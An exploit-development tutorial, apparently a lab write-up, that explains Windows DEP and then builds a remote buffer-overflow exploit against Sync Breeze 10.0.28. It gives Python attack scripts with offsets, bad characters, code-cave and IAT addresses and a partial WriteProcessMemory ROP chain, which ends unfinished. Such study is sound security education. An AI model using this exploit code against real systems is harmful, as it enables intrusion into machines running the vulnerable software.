## Bypassing DEP

## What is DEP?

In Windows binary exploitation, **DEP** stands for **Data Execution Prevention**. DEP is a security feature introduced by Microsoft to prevent certain types of exploits, particularly those that attempt to execute code from areas of memory that should only contain data. By marking these areas as non-executable, DEP mitigates risks from buffer overflows and similar memory corruption attacks that often inject malicious code into the stack, heap, or other data sections.

### How DEP Works
1. **Memory Marking**: DEP designates specific memory regions as *non-executable*, so code cannot be executed from these areas. For example:
   - **Stack** and **Heap** regions are typically marked as non-executable.
   - **Code** segments, where legitimate executable code resides, are marked as executable.

2. **Hardware and Software DEP**:
   - **Hardware-enforced DEP**: Uses the CPU’s No-Execute (NX) bit, which marks memory pages as executable or non-executable. This provides robust protection since it leverages CPU hardware.
   - **Software-enforced DEP**: Monitors and prevents certain actions in Windows, but without hardware support, it’s less effective.

### DEP in Exploitation Mitigation
DEP makes it much harder for attackers to execute their payload directly in memory regions meant for data storage. Without DEP, a typical exploit might:
   1. Overflow a buffer on the stack or heap.
   2. Inject malicious code into that area.
   3. Redirect execution to this injected code.

With DEP enabled, the injected code on the stack or heap cannot be executed, as these areas are marked non-executable. This forces attackers to find alternative methods, such as **Return-Oriented Programming (ROP)**, where they use existing executable code snippets to build their payload indirectly.

### Bypassing DEP
While DEP is a strong deterrent, advanced exploit techniques can bypass it:
   - **Return-Oriented Programming (ROP)**: This technique leverages "gadgets"—small instruction sequences ending in a return statement—found in legitimate executable code. By chaining these gadgets, attackers can create complex payloads without needing to inject new executable code.
   - **Memory Corruption in DEP-enabled Code Segments**: If attackers can manipulate function pointers or other control data within executable memory, they may still execute malicious sequences.

### DEP and Exploitation
DEP was a game-changer in making exploits more challenging, especially when combined with other mitigations like **ASLR** (Address Space Layout Randomization). These technologies together increase the difficulty of reliably exploiting vulnerabilities, as they prevent straightforward code injection and make payload development more complex.

## Exploiting Sync Breeze 10.0.28

In this case, we will start by providing an exploit that already includes the offset to reach EIP and the bad characters. This way, we will speed up the process and focus on what’s important.

```py
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        size = 800
        offset = 780

        shellcode = b""
        
        # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d

        filler = b"A" * offset
        eip = b"B" * 4

        inputBuffer = filler + eip

        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()

```

If we send the exploit we can see four "B" characters at "eip" register. Now we have to begin with the DEP bypassing.

To bypass DEP, we can use several functions of Windows API like "VirtualAlloc", "VirtualProtect", or "WriteProcessMemory". In this case we have selected the "WriteProcessMemory" way.

### What is WriteProcessMemory?

WriteProcessMemory is a Windows API function used to write data to a specific area of memory in a process running on the Windows operating system.

```
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);

```


- `hProcess` is a handle to the process memory to be modified. since we will be using the same current process the value will be -1 or 0xFFFFFFFF and this is called pseudo handle.
- `lpBaseAddress` A pointer to a place / buffer and it’s called code cave in the memory where our shellcode will be writtren in.
- `lpBuffer` This is basically the address of the shellcode, our shellcode will be in the lpBuffer and WPM will copy the shellcode from the lpBuffer and write to the address in lpBaseAddress
- `nSize` This specifis the size of the shellcode and it must be same size as the shellcode or bigger.
- `lpNumberOfBytesWritten` basically an optional argument and it can be NULL. It’s a pointer to a variable that receives the number of bytes transferred into the specified process by WPM.

As earlier mentioned that lpBaseAddress points to a code cave.

Code cave is an empty/unused memory region getting created by the compiler when compiling the software. This region must have READ & EXECUTE permissions.

We need to push into the stack 7 values: the "WriteProcessMemory" function address, the return address of the function, and the five arguments. For that we will use an skeleton, which are dummy values that are pushed into the stack, then we will modify these values with ROP gadgets, and finally we will call the function with the desired values.

To start with this ROP challenge we have to move the "esp" address to other register to be able to access and modify the values at the stack. The first ROP gadget will be a "push esp" instruction (if it exists). The first step is finding a module in the binary that is not compiled with "ASLR" and that does not have badchars at the address.

![imagen](https://github.com/user-attachments/assets/2ff7392f-af29-4c29-a26d-268b4e43aaad)

Next, we use the following command in WinDbg --> `!nmod`

![imagen](https://github.com/user-attachments/assets/39150fcf-bcf9-4c05-ab7a-c97beb3797c8)

We see that "libspp.dll" is a good candidate, so we are going to use a tool that extracts the gadgets of that module.

![imagen](https://github.com/user-attachments/assets/3135ca51-0736-4036-8930-57925eec0e83)

We find several gadgets:

![imagen](https://github.com/user-attachments/assets/09344cf2-10c8-4535-a1c4-381893f6c442)

The first one has the badchar "0a" so we choose the second one and we add it to the exploit.

![imagen](https://github.com/user-attachments/assets/e3038ebd-c569-406c-837e-4b0e69cf6963)

### Code Cave

We can find the offset to the PE header by dumping the DWORD at offset 0x3C. Next, we’ll add 0x2C to the offset to find the offset to the code section:

![imagen](https://github.com/user-attachments/assets/24f69ca8-c27b-4b95-b6ce-abe3b4ca938a)

We use the following command --> `!address 10001000`

And obtain the following output:

![imagen](https://github.com/user-attachments/assets/5d76357e-e6a6-4e87-9f8a-90d837000a03)

We need to search space for the shellcode:

![imagen](https://github.com/user-attachments/assets/28d83696-c3c7-42d6-afba-19dd748871dc)

![imagen](https://github.com/user-attachments/assets/07e5dd08-0053-457a-8563-972a3561f0f6)

Because of the nullbyte, add 4 to the address 0x10167a00 resulting the address 0x10167a04.

`lpNumberOfBytesWritten` argument needs to be a pointer to a writable DWORD where WriteProcessMemory will store the number of bytes that were copied. We could use a stack address for this pointer, but it’s easier to use an address inside the data section of the module you are using.

We use the `!dh` command to find the data section’s start address, supplying the -a flag to dump the name of the module.

![imagen](https://github.com/user-attachments/assets/36b3ff52-87e2-45f5-86b5-cf587bb55c93)

We need to check the contents of the address to ensure they are not being used and to verify memory protections. Section headers must be aligned on a page boundary, so let’s dump the contents of the address just past the size value.

![imagen](https://github.com/user-attachments/assets/ddd71d00-6142-411e-9cb0-7e87b70d0ab1)

![imagen](https://github.com/user-attachments/assets/f0124769-6cbc-4a76-ba12-e904d8d982cc)

Now we have a problem with the WriteProcessMemory address...

WPM is part of KERNEL32, and KERNEL32 is a system DLL so it has ASLR enabled by default that means the real address of WPM will change each time rebooting the system or the software.
The IAT addresses that point to functions are static meaning the IAT Address of WPM that points to the real WPM is static and won’t change.

So let's inspect the IAT with `!dh -f libspp` command:

![imagen](https://github.com/user-attachments/assets/ff42e42a-8604-44e4-b07a-7fa44ca67fd2)

![imagen](https://github.com/user-attachments/assets/7860cd87-f3b0-4700-9e3a-0a139c81c3be)

As you can see, there is no WriteProcessMemory function in the output so we need to choose another function and calculate the offset to WPM.

![imagen](https://github.com/user-attachments/assets/ee912fb5-989b-4a97-aa9e-6fb56cc04db2)

Let's begin with the ROP. For now we have the following exploit:

```py
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        size = 800
        offset = 780

        shellcode = b"\x90" * 400
        
        # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d
        # ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub 0xfffe2930
        # KERNEL32!GetLastErrorStub IAT address --> 0x10168040
        # CODE CAVE --> 0x10167a04
        # Writable memory address --> 0x1020c044

        #BOOL WriteProcessMemory(
        #    [in]  HANDLE  hProcess,
        #    [in]  LPVOID  lpBaseAddress,
        #    [in]  LPCVOID lpBuffer,
        #    [in]  SIZE_T  nSize,
        #    [out] SIZE_T  *lpNumberOfBytesWritten
        #);

        wpm = pack("<L", 0x43434343)  # dummy WriteProcessMemory Address
        wpm += pack("<L", 0x10167a04) # Return Address after WriteProcessMemory
        wpm += pack("<L", 0xFFFFFFFF) # hProcess
        wpm += pack("<L", 0x10167a04) # lpBaseAddress (Code cave address)
        wpm += pack("<L", 0x46464646) # lpBuffer
        wpm += pack("<L", 0x47474747) # nSize
        wpm += pack("<L", 0x1020c044) # lpNumberOfBytesWritten (Writable memory address)

        filler = b"A" * (offset - len(wpm))

        # PUSH ESP and Realloc
        eip = pack("<L", 0x100bb515)    # push esp; ret ;

        rop = pack("<L", 0x1002f729)    # pop eax; ret ;

        inputBuffer = filler + wpm + eip + rop + shellcode

        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()
```

Before we encountered a "push esp" gadget but if esp includes badchars we would have problems pushing it to the stack, so we need to find a gadget that push and pop the esp before the "ret" instruction.

![imagen](https://github.com/user-attachments/assets/ecdba7c5-ee8f-4cf5-b8e6-72e1690b2590)

Now we have to calculate the negative offset between "esi" and our wpm's beginning:

![imagen](https://github.com/user-attachments/assets/5593a8c5-0e64-4fb4-88c6-f0140dc046f9)

![imagen](https://github.com/user-attachments/assets/fe8cab90-463c-4560-9dd4-2aacb4b16f30)

So "esi - 0n36" is the top of our wpm skeleton.

![imagen](https://github.com/user-attachments/assets/f90d2d28-8774-4c43-9e3b-53632c419df1)

Now I want to move the value in EAX to other register, since we use EAX for arithmetic much more.

Our ROP has the following appearance for now:

```py
# PUSH ESP and Realloc
eip = pack("<L", 0x10154112)        # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;

rop = pack('<L', 0x1013ada1)        # mov eax, esi ; pop esi ; ret
rop += b"A" * 4                     # dummy for the ESI
rop += pack('<L', 0x10151821)       # pop ebp ; ret
rop += pack('<L', 0xffffffdc)       # -0n36
rop += pack('<L', 0x100fcd71)       # add eax, ebp ; dec ecx ; ret
rop += pack("<L", 0x100cb4d4)       # xchg eax, edx ; ret
```
